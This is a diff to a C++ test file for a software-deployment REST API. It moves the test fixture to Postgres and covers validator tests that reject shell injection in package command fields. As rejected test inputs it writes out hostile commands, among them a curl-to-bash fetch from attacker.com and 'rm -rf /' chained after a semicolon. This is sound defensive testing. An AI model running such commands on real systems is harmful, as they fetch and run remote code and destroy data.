@@ -25,6 +25,7 @@
  */
 
 #include "audit_store.hpp"
+#include "pg/pg_pool.hpp"
 #include "rest_api_v1.hpp"
 #include "software_deployment_store.hpp"
 #include "test_route_sink.hpp"
@@ -37,14 +38,24 @@
 
 #include "../test_helpers.hpp"
 
-#include <filesystem>
+#include <stdexcept>
 #include <string>
 #include <vector>
 
-namespace fs = std::filesystem;
 using namespace yuzu::server;
 
 namespace {
+
+// Pre-migrated template — shares the "swdeploystore" key with
+// test_software_deployment_store.cpp's own template (identical setup,
+// replay-verified per docs/postgres-store-playbook.md step 7).
+yuzu::test::PgTestTemplate rest_sw_deploy_store_tpl{
+    "swdeploystore", [](const std::string& dsn) {
+        yuzu::server::pg::PgPool pool{{.conninfo = dsn, .size = 1}};
+        SoftwareDeploymentStore store{pool};
+        if (!store.is_open())
+            throw std::runtime_error("software_deployment_store template: failed to migrate");
+    }};
 
 struct AuditRecord {
     std::string action;
@@ -56,7 +67,15 @@ struct AuditRecord {
 struct SwPkgHarness {
     yuzu::server::test::TestRouteSink sink;
 
-    fs::path db_path;
+    // No earlier-constructed PG member to inherit a skip guard from — this
+    // harness gives itself the explicit guard the playbook's test-file-
+    // drift note requires (docs/postgres-store-playbook.md "Long-lived
+    // migration branches..."): copying a SKIP-via-earlier-member shape onto
+    // a fixture without one would silently turn "skip locally" into
+    // "hard-fail locally". PgPool declared before the store so it
+    // destructs AFTER it (member destruction order).
+    std::optional<yuzu::test::PostgresTestDb> sw_deploy_db;
+    std::optional<yuzu::server::pg::PgPool> sw_deploy_pool;
     std::unique_ptr<SoftwareDeploymentStore> sw_deploy_store;
 
     std::string session_user{"admin"};
@@ -67,9 +86,17 @@ struct SwPkgHarness {
     yuzu::MetricsRegistry metrics;
     RestApiV1 api;
 
-    SwPkgHarness() : db_path(yuzu::test::unique_temp_path("rest-sw-pkg-")) {
-        fs::remove(db_path);
-        sw_deploy_store = std::make_unique<SoftwareDeploymentStore>(db_path);
+    SwPkgHarness() {
+        if (yuzu::test::pg_admin_dsn_env() == nullptr) {
+            SKIP("YUZU_TEST_POSTGRES_DSN not set - Postgres test skipped");
+        }
+        sw_deploy_db.emplace(rest_sw_deploy_store_tpl);
+        INFO("[SwPkgHarness fixture] status (blank == came up OK): " << sw_deploy_db->error());
+        REQUIRE(sw_deploy_db->available());
+        sw_deploy_pool.emplace(
+            yuzu::server::pg::PgPool::Options{.conninfo = sw_deploy_db->dsn(), .size = 4});
+        REQUIRE(sw_deploy_pool->valid());
+        sw_deploy_store = std::make_unique<SoftwareDeploymentStore>(*sw_deploy_pool);
         REQUIRE(sw_deploy_store->is_open());
 
         auto auth_fn = [this](const httplib::Request&,
@@ -114,10 +141,7 @@ struct SwPkgHarness {
                             /*metrics_registry=*/&metrics);
     }
 
-    ~SwPkgHarness() {
-        sw_deploy_store.reset();
-        fs::remove(db_path);
-    }
+    ~SwPkgHarness() = default;
 
     /// Build a JSON body for POST /api/v1/software-packages with arbitrary
     /// verify_command / rollback_command. Other fields use safe defaults.
@@ -143,7 +167,7 @@ struct SwPkgHarness {
 // ── Happy path: realistic install verification vocabulary ────────────────────
 
 TEST_CASE("REST POST software-packages: msiexec verify_command accepted",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     // MSI product GUID — braces are intentionally NOT shell-metachars on the
     // agent side (we execvp / CreateProcessW, no shell), so they are allowed.
@@ -157,7 +181,7 @@ TEST_CASE("REST POST software-packages: msiexec verify_command accepted",
 }
 
 TEST_CASE("REST POST software-packages: reg-query verify_command accepted",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     auto res =
         h.post(SwPkgHarness::make_body(R"(reg query HKLM\\Software\\Mozilla)", "", "Firefox-reg"));
@@ -166,7 +190,7 @@ TEST_CASE("REST POST software-packages: reg-query verify_command accepted",
 }
 
 TEST_CASE("REST POST software-packages: dpkg verify_command accepted",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     auto res = h.post(
         SwPkgHarness::make_body("dpkg -s firefox", "apt-get remove -y firefox", "Firefox-deb"));
@@ -175,7 +199,7 @@ TEST_CASE("REST POST software-packages: dpkg verify_command accepted",
 }
 
 TEST_CASE("REST POST software-packages: empty verify+rollback accepted (optional fields)",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("", "", "Firefox-no-verify"));
     REQUIRE(res);
@@ -185,7 +209,7 @@ TEST_CASE("REST POST software-packages: empty verify+rollback accepted (optional
 // ── Injection rejection: cluster-2 RCE attack vector ─────────────────────────
 
 TEST_CASE("REST POST software-packages: pipe-to-shell verify_command rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // The exact PoC from #771's issue body.
     auto res = h.post(SwPkgHarness::make_body("curl http://attacker.com/shell.sh | bash"));
@@ -196,11 +220,13 @@ TEST_CASE("REST POST software-packages: pipe-to-shell verify_command rejected",
     CHECK(h.audit_log[0].result == "denied");
     CHECK(h.audit_log[0].detail.find("verify_command") != std::string::npos);
     // No package was persisted.
-    CHECK(h.sw_deploy_store->list_packages().empty());
+    auto pkgs = h.sw_deploy_store->list_packages();
+    REQUIRE(pkgs.has_value());
+    CHECK(pkgs->empty());
 }
 
 TEST_CASE("REST POST software-packages: injection via rollback_command rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // verify_command is benign; the injection is in rollback_command. The
     // rejection must surface that specific field by name in the audit detail
@@ -214,7 +240,9 @@ TEST_CASE("REST POST software-packages: injection via rollback_command rejected"
     CHECK(h.audit_log[0].action == "software_package.create");
     CHECK(h.audit_log[0].result == "denied");
     CHECK(h.audit_log[0].detail.find("rollback_command") != std::string::npos);
-    CHECK(h.sw_deploy_store->list_packages().empty());
+    auto pkgs = h.sw_deploy_store->list_packages();
+    REQUIRE(pkgs.has_value());
+    CHECK(pkgs->empty());
 }
 
 // Note on validator scope: this PR blocks INJECTION-VIA-SHELL-METACHARACTERS,
@@ -227,7 +255,7 @@ TEST_CASE("REST POST software-packages: injection via rollback_command rejected"
 // references to whitelisted InstructionDefinitions. Tracked separately.
 
 TEST_CASE("REST POST software-packages: semicolon command chaining rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox; rm -rf /"));
     REQUIRE(res);
@@ -235,7 +263,7 @@ TEST_CASE("REST POST software-packages: semicolon command chaining rejected",
 }
 
 TEST_CASE("REST POST software-packages: backtick substitution rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("echo `whoami`"));
     REQUIRE(res);
@@ -243,7 +271,7 @@ TEST_CASE("REST POST software-packages: backtick substitution rejected",
 }
 
 TEST_CASE("REST POST software-packages: dollar-paren substitution rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("echo $(whoami)"));
     REQUIRE(res);
@@ -251,7 +279,7 @@ TEST_CASE("REST POST software-packages: dollar-paren substitution rejected",
 }
 
 TEST_CASE("REST POST software-packages: stdout redirection rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox > /tmp/leak"));
     REQUIRE(res);
@@ -259,7 +287,7 @@ TEST_CASE("REST POST software-packages: stdout redirection rejected",
 }
 
 TEST_CASE("REST POST software-packages: && chaining rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     auto res = h.post(SwPkgHarness::make_body("ok && evil"));
     REQUIRE(res);
@@ -267,7 +295,7 @@ TEST_CASE("REST POST software-packages: && chaining rejected",
 }
 
 TEST_CASE("REST POST software-packages: oversize command rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     std::string big(600, 'a'); // exceeds 512-char cap
     auto res = h.post(SwPkgHarness::make_body(big));
@@ -276,7 +304,7 @@ TEST_CASE("REST POST software-packages: oversize command rejected",
 }
 
 TEST_CASE("REST POST software-packages: exactly-at-cap command accepted",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     std::string at_cap(512, 'a');
     auto res = h.post(SwPkgHarness::make_body(at_cap, "", "ExactCap"));
@@ -287,7 +315,7 @@ TEST_CASE("REST POST software-packages: exactly-at-cap command accepted",
 // ── Sibling-gap: silent_args validated identically (round 1 governance) ──────
 
 TEST_CASE("REST POST software-packages: silent_args injection rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // Construct a body where verify+rollback are clean but silent_args carries
     // the injection. Without R1 hardening this passed validation.
@@ -301,11 +329,13 @@ TEST_CASE("REST POST software-packages: silent_args injection rejected",
     REQUIRE(h.audit_log.size() == 1);
     CHECK(h.audit_log[0].result == "denied");
     CHECK(h.audit_log[0].detail.find("silent_args") != std::string::npos);
-    CHECK(h.sw_deploy_store->list_packages().empty());
+    auto pkgs = h.sw_deploy_store->list_packages();
+    REQUIRE(pkgs.has_value());
+    CHECK(pkgs->empty());
 }
 
 TEST_CASE("REST POST software-packages: silent_args /qn /norestart accepted",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     // Standard MSI silent install args — must pass the validator.
     std::string body = R"({"name":"SilentOK","version":"1.0",)"
@@ -319,7 +349,7 @@ TEST_CASE("REST POST software-packages: silent_args /qn /norestart accepted",
 // ── C0 control characters (security MEDIUM-2): tab / VT / FF blocked ─────────
 
 TEST_CASE("REST POST software-packages: tab character rejected",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // Tab is a shell word-separator in bash/zsh — same risk class as space
     // with extra log-injection nastiness. Should be blocked alongside other
@@ -332,7 +362,7 @@ TEST_CASE("REST POST software-packages: tab character rejected",
 // ── Bad JSON payload types (unhappy #1): 400 not 500 ─────────────────────────
 
 TEST_CASE("REST POST software-packages: non-string verify_command returns 400 not 500",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // body.value("verify_command", "") throws json::type_error on type
     // mismatch. Without the try/catch wrapper the exception escapes the
@@ -347,7 +377,7 @@ TEST_CASE("REST POST software-packages: non-string verify_command returns 400 no
 }
 
 TEST_CASE("REST POST software-packages: explicit null verify_command rejected as wrong type",
-          "[rest][software_deployment][771][security]") {
+          "[rest][software_deployment][771][security][pg]") {
     SwPkgHarness h;
     // nlohmann::json::value(key, default) THROWS json::type_error when the
     // key is present-but-null (because std::string is not nullable). The
@@ -368,7 +398,7 @@ TEST_CASE("REST POST software-packages: explicit null verify_command rejected as
 }
 
 TEST_CASE("REST POST software-packages: missing verify_command field defaults to empty",
-          "[rest][software_deployment][771]") {
+          "[rest][software_deployment][771][pg]") {
     SwPkgHarness h;
     // Omitting the field entirely — the documented "no verify command"
     // posture. value(key, "") returns "" for absent keys; the validator
